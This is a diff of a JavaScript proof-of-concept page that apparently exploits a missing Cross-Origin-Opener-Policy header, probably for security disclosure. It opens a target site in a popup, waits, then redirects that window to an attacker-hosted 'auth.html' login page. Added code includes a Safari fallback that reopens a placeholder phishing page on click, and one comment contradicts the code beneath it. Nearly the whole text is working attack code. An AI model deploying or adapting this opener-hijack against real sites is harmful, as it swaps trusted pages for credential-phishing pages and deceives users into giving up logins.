@@ -18,14 +18,12 @@
   const params = new URLSearchParams(window.location.search);
   const target = params.get('target');
   let win;
-  let redirectTimer;
+  let pollTimer;
 
   function openTarget() {
     if (!target) return;
-
     win = window.open(target, 'victimWindow');
 
-    // If popup was blocked, win may be null or blocked
     if (!win || win.closed || typeof win.closed === 'undefined') {
       document.getElementById('msg').textContent =
         'Popup was blocked. Please click anywhere to continue the demonstration.';
@@ -33,23 +31,41 @@
     }
 
     document.getElementById('msg').style.display = 'none';
+    startPolling();
+  }
 
-    // Give the target page time to load before hijacking
-    redirectTimer = setTimeout(navigateAway, 5000);
+  function startPolling() {
+    let elapsed = 0;
+    pollTimer = setInterval(() => {
+      elapsed += 500;
+
+      if (elapsed >= 5000) {
+        clearInterval(pollTimer);
+        navigateAway();
+      }
+    }, 500);
   }
 
   function navigateAway() {
-    if (win && !win.closed) {
-      try {
+    try {
+      if (win && !win.closed) {
         win.location = 'https://chrpz.github.io/coop-poc/auth.html';
-      } catch (e) {
-        // COOP is set — cross-origin navigation blocked (expected if fixed)
-        document.getElementById('msg').textContent =
-          'Navigation blocked — COOP header is properly configured.';
-        document.getElementById('msg').style.display = 'block';
       }
+    } catch (e) {
+      // Safari severed the opener — fallback
+      document.getElementById('msg').textContent =
+        'Safari prevented automatic navigation. Click anywhere to proceed.';
+      document.getElementById('msg').style.display = 'block';
+
+      // On click, redirect current page instead as fallback demo
+      document.body.onclick = () => {
+        window.open('https://<username>.github.io/<repo-name>/auth.html', 'victimWindow');
+      };
     }
   }
+
+  // Click handler for manual popup unblock
+  document.body.onclick = openTarget;
 
   // Auto-trigger on load
   window.onload = () => setTimeout(openTarget, 1500);
